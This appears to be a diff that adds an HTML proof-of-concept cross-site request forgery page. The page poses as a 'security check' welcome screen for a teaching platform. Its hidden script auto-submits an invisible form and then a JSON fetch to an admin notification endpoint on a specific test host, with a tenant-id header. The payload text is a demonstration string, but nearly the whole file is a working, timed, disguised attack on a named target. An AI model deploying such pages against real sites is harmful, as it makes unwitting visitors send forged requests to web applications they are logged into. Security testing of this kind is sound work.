@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>安全检测页面</title>
+</head>
+<body>
+    <h1>欢迎使用教学平台</h1>
+    <p>请等待系统检测...</p>
+    
+    <iframe id="hiddenFrame" style="display:none"></iframe>
+    
+    <script>
+        // 自动提交CSRF表单
+        function launchCSRF() {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://test.xuandou.vip:48082/admin-api/teacher/home/message-notification-details-by-teacher';
+            form.style.display = 'none';
+            
+            const fields = {
+                'title': 'CSRF攻击测试',
+                'content': '这是一个CSRF攻击演示',
+                'type': 'malicious'
+            };
+            
+            for (const [key, value] of Object.entries(fields)) {
+                const input = document.createElement('input');
+                input.name = key;
+                input.value = value;
+                form.appendChild(input);
+            }
+            
+            document.body.appendChild(form);
+            form.submit();
+            console.log('CSRF攻击已发起');
+        }
+        
+        // 延迟执行攻击
+        setTimeout(launchCSRF, 3000);
+        
+        // 尝试JSON CSRF
+        setTimeout(() => {
+            fetch('https://test.xuandou.vip:48082/admin-api/teacher/home/message-notification-details-by-teacher', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'tenant-id':164
+                },
+                body: JSON.stringify({
+                    malicious: true,
+                    data: 'JSON CSRF攻击'
+                })
+            }).then(response => {
+                console.log('JSON CSRF响应:', response.status);
+            });
+        }, 5000);
+    </script>
+</body>
+</html>
+        
